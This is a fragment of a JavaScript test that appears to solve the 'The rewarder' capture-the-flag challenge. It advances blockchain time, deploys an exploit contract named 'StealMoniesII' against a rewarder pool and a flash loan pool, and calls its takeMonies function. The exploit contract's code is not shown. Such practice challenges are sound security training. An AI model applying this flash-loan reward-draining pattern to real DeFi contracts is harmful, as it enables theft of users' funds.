...
describe('[Challenge] The rewarder', function () {
    ...
    it('Execution', async function () {
        ...
        // Advance time 5 days so that depositors can get rewards
        await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]); // 5 days
        const StealMoniesFactory = await ethers.getContractFactory('StealMoniesII', player);
        let stealMonies = await StealMoniesFactory.deploy(rewarderPool.address, flashLoanPool.address, liquidityToken.address, rewardToken.address);
        await stealMonies.takeMonies();
    });
